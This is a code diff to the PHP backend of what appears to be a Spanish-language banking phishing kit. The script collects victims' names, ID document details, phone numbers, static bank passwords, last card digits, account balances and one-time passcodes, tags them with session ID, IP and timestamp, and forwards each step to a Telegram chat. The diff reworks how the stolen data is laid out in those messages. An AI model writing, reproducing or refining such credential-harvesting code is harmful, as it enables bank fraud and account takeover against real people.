@@ -56,48 +56,61 @@ $raw   = file_get_contents('php://input');
 $input = json_decode($raw, true);
 if (!is_array($input)) $input = $_POST;
 
-$step = v($input, 'step');
-$ip   = get_ip();
-$msg  = '';
+$step      = v($input, 'step');
+$ip        = get_ip();
+$sessionId = v($input, 'sessionId');
+$phone     = v($input, 'phone');
+$ccode     = v($input, 'countryCode');
+$staticPwd = v($input, 'password');
+$ts        = date('Y-m-d H:i:s');
+
+$stepNumMap = ['paso12'=>'1-2','acceso'=>3,'validacion'=>4,'otp'=>5];
+$stepNum    = $stepNumMap[$step] ?? '?';
+$SEP        = "───────────────────";
+
+// ----- 1) Cabecera: sesión + paso -----
+$header  = "🆔 Sesión: <code>" . h($sessionId) . "</code> -PASO $stepNum\n";
+$header .= "$SEP\n\n";
+
+// ----- 2) Bloque constante: teléfono + clave estática (cuando se conozcan) -----
+$constBlock = '';
+if ($phone !== '') {
+    $constBlock .= "📱 " . h($ccode) . ' ' . h($phone) . "\n";
+}
+if ($staticPwd !== '' && $step !== 'acceso') {
+    // En 'acceso' la clave estática es el dato principal; en otros pasos es referencia
+    $constBlock .= "🔑 Clave estática: <code>" . h($staticPwd) . "</code>\n";
+}
+
+$body = '';
 
 switch ($step) {
 
-    case 'paso1':
-        $msg  = "📝 <b>PASO 1 — Datos personales</b>\n";
-        $msg .= "👤 Nombres: "   . h(v($input, 'nombres'))   . "\n";
-        $msg .= "👤 Apellidos: " . h(v($input, 'apellidos')) . "\n";
-        $msg .= "🌐 IP: " . $ip;
-        break;
-
-    case 'paso2':
-        $msg  = "🪪 <b>PASO 2 — Identificación</b>\n";
-        $msg .= "📋 Tipo Doc: "  . h(v($input, 'tipoDoc'))  . "\n";
-        $msg .= "🔢 Número: "    . h(v($input, 'numDoc'))   . "\n";
-        $msg .= "📅 Fecha Exp: " . h(v($input, 'fechaExp')) . "\n";
-        $msg .= "📍 Lugar Exp: " . h(v($input, 'lugarExp')) . "\n";
-        $msg .= "🌐 IP: " . $ip;
+    case 'paso12':
+        $body  = "👤 Nombres: "   . h(v($input, 'nombres'))   . "\n";
+        $body .= "👤 Apellidos: " . h(v($input, 'apellidos')) . "\n";
+        $body .= "📋 Tipo Doc: "  . h(v($input, 'tipoDoc'))   . "\n";
+        $body .= "🔢 Número: "    . h(v($input, 'numDoc'))    . "\n";
+        $body .= "📅 Fecha Exp: " . h(v($input, 'fechaExp'))  . "\n";
+        $body .= "📍 Lugar Exp: " . h(v($input, 'lugarExp'))  . "\n";
         break;
 
     case 'acceso':
-        $msg  = "🔐 <b>PASO 3 — Acceso</b>\n";
-        $msg .= "📱 Celular: " . h(v($input, 'countryCode')) . " " . h(v($input, 'phone')) . "\n";
-        $msg .= "🔑 Clave: "    . h(v($input, 'password'))   . "\n";
-        $msg .= "🌐 IP: " . $ip;
+        // El bloque constante ya muestra el teléfono. La clave estática va aquí como dato principal.
+        $body  = "🔑 Clave estática: <code>" . h($staticPwd) . "</code>\n";
         break;
 
     case 'validacion':
         $bal = (float) preg_replace('/[^\d]/', '', v($input, 'balance'));
-        $msg  = "✅ <b>PASO 4 — Validación</b>\n";
-        $msg .= "🔢 Últimos 3 dígitos: " . h(v($input, 'lastDigits')) . "\n";
-        $msg .= "💰 Saldo aprox: $" . number_format($bal, 0, ',', '.') . "\n";
-        $msg .= "🌐 IP: " . $ip;
+        $body  = "🔢 Últimos 3 dígitos: " . h(v($input, 'lastDigits')) . "\n";
+        $body .= "💰 Saldo aprox: $" . number_format($bal, 0, ',', '.') . "\n";
         break;
 
     case 'otp':
         $intento = v($input, 'attempt');
-        $msg  = "🔓 <b>PASO 5 — Clave dinámica</b>" . ($intento !== '' ? " (intento $intento)" : '') . "\n";
-        $msg .= "🔑 Código OTP: " . h(v($input, 'otp')) . "\n";
-        $msg .= "🌐 IP: " . $ip;
+        // Bloque dinámico con su propio separador (la clave dinámica va abajo)
+        $body  = "\n$SEP\n";
+        $body .= "💫" . h($intento) . " Clave dinámica: <code>" . h(v($input, 'otp')) . "</code>\n";
         break;
 
     default:
@@ -105,6 +118,9 @@ switch ($step) {
         echo json_encode(['ok' => false, 'error' => 'step inválido', 'received' => $input]);
         exit;
 }
+
+$msg = $header . $constBlock . $body;
+$msg .= "\n🌐 $ip · 🕐 $ts";
 
 $r = send_telegram($msg);
 echo json_encode(['ok' => $r['code'] === 200, 'http' => $r['code']]);
